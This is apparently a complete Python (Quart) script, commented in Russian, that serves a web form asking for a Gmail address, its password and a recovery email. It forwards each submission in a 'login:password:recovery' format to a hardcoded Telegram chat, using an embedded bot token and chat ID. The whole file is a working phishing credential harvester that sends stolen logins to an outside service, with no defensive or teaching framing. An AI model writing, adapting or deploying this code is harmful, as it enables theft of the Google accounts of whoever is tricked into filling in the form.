import os
from quart import Quart, render_template, request
from telegram import Bot

app = Quart(__name__)

# Путь к Telegram Bot API Token
telegram_token = '7432054726:AAFnkMq3_C7iiKbRNY6mhNGb_kvx74Nxa54'
chat_id = '1361079299'

# Создание экземпляра Telegram бота
bot = Bot(token=telegram_token)

@app.route("/", methods=["GET", "POST"])
async def form():
    if request.method == "POST":
        gmail = await request.form.get("gmail")
        password = await request.form.get("password")
        recovery_email = await request.form.get("recovery_email")

        # Формирование сообщения для отправки в Telegram
        message = f"\n{gmail}:{password}:{recovery_email}"
        
        # Асинхронная отправка сообщения в Telegram
        await bot.send_message(chat_id=chat_id, text=message)

        # Отображение страницы с успешной отправкой данных
        return await render_template("success.html", gmail=gmail, recovery_email=recovery_email)

    return await render_template("form.html")

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
